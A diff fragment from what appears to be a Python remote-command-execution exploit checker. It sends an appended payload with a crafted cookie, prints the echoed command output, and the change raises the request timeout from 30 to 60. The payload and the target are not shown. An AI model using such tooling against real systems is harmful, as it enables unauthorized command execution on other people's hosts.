@@ -16,7 +16,7 @@ def pr(host,cmd):
         cookie="CID={}".format(cookie)
         headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                    "Cookie": cookie}
-        response=requests.get(url=url+payload1,headers=headers2,verify=False,timeout=30)
+        response=requests.get(url=url+payload1,headers=headers2,verify=False,timeout=60)
         if response.text != '':
             print(url+"漏洞存在，命令回显："+response.text)
         else:
